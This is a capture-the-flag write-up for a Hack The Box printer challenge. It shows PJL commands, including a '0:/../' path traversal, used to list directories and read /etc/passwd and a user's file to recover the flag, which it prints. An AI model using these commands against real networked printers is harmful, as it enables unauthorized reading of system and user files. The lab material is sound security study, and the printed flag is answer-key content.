# Wander
Saw the `@PJL INFO ID` in the command box in `Job Controls.` Seems like we have to use PJL - Printer Job Language to somehow extract the printer's password.

Bruteforcing the password is obviously not an option. For challenge like this, we have to find a way for some information to dump out.
Using [HP's PJL manual](https://developers.hp.com/sites/default/files/PJL_Technical_Reference_Manual.pdf), we know that printer has a disk drive, and PJL can explore that *file system* - ah the usual "searching the directories for a certain flag.txt"

<img width="278" height="808" alt="image" src="https://github.com/user-attachments/assets/765c1205-7ad8-4583-a22f-54afb98c6565" />

From reading the manual above, we have for us the 2 most important commands: `FSDIRLIST` to "returns a list of files and directories which exist within the specified directory on the printer's file system" (literally the PJL version of `ls`), and `FSUPLOAD` to "ploads a file, or a part of a file, from the printer file system to the host" (~ `cat`).

<img width="637" height="383" alt="image" src="https://github.com/user-attachments/assets/3cece484-6a48-4f8d-83bc-80754b49f70f" />

Using the filesystem syntax above, trying with `@PJL FSDIRLIST NAME="0:/"` returned

<img width="449" height="373" alt="image" src="https://github.com/user-attachments/assets/1bd2c5d0-cc69-496c-b8b5-c83c66c9fc0e" />

(continue to dive deeper) 

`@PJL FSDIRLIST NAME="0:/webServer/lib/"`

<img width="447" height="303" alt="image" src="https://github.com/user-attachments/assets/471940cd-6f71-4c4d-aff1-e4d4b81b0260" />

(omg so close, why SIZE=0 :sob:)

I explored everything inside `0:/` and found nothing :).
But who could have guessed there's also `/../` in PJL filesystem XD.
`@PJL FSDIRLIST NAME="0:/../"`

<img width="446" height="487" alt="image" src="https://github.com/user-attachments/assets/f806f25b-992a-43f3-838b-daa45eba8be2" />

(continue to dive deeper)

`@PJL FSDIRLIST NAME="0:/../etc/"`

<img width="432" height="299" alt="image" src="https://github.com/user-attachments/assets/4aad9ecb-6e4a-44e5-8ca8-983eb2bb4eda" />

Ah here we are. 

`@PJL FSUPLOAD NAME="0:/../etc/passwd"`

<img width="824" height="483" alt="image" src="https://github.com/user-attachments/assets/825a6e60-87a5-4bc8-a1ef-3ddcab2db3f6" />

So there's a **non-root** user named *default* here. Seems like it's the "uncle".

`@PJL FSDIRLIST NAME="0:/../home/default/"`

<img width="451" height="290" alt="image" src="https://github.com/user-attachments/assets/0ae028fe-9799-4f9d-a21c-5c9a2733bc02" />

`@PJL FSUPLOAD NAME="0:/../home/default/readyjob"`

<img width="830" height="421" alt="image" src="https://github.com/user-attachments/assets/a7d7794a-0ac3-4ddd-87cf-a3e9ee9a53b9" />

*flag*: `HTB{w4lk_4nd_w0nd3r}`
